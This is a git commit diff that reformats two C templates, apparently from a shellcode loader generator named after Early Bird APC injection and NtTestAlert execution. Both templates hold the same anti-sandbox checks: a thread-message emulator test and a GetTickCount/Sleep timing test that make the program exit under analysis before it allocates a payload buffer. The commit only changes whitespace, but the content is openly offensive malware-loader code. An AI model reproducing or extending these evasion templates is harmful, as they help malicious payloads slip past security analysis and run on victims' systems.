b1deea87724795d2b2dc07fe23d08ef3d60ce854
email = 1959132915@qq.com <1959132915@qq.com>
2020-12-17 14:14:25 +0800

    formatting code and add runptr tamplate

--- templates/tpl_earlybird.py
+++ templates/tpl_earlybird.py
@@ -28,19 +28,20 @@ typedef DWORD (WINAPI* pResumeThread)(
 
 int main()
 {
-        MSG msg;
-        DWORD tc;
-        PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
-        if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
+
+    MSG msg;
+    DWORD tc;
+    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
+    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                 return 0;
 
-        if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
-                return 0;
-        tc = GetTickCount();
-        Sleep(650);
+    if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
+    return 0;
+    tc = GetTickCount();
+    Sleep(650);
 
-        if (((GetTickCount() - tc) / 300) != 2)
-                return 0;
+    if (((GetTickCount() - tc) / 300) != 2)
+        return 0;
 
 	PCHAR lpBuffer = <ALLOC>
 
--- templates/tpl_nttestalert.py
+++ templates/tpl_nttestalert.py
@@ -8,19 +8,20 @@ typedef VOID(NTAPI* pNtTestAlert)(VOID);
 <TABLES>
 int main() {
 
-        MSG msg;
-        DWORD tc;
-        PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
-        if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
+
+    MSG msg;
+    DWORD tc;
+    PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
+    if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
                 return 0;
 
-        if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
-                return 0;
-        tc = GetTickCount();
-        Sleep(650);
+    if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
+    return 0;
+    tc = GetTickCount();
+    Sleep(650);
 
-        if (((GetTickCount() - tc) / 300) != 2)
-                return 0;
+    if (((GetTickCount() - tc) / 300) != 2)
+        return 0;
                 
 	PCHAR lpBuffer = <ALLOC>
 	for (int i = 0; i < sizeof(offset_table)/sizeof(DWORD); i++)
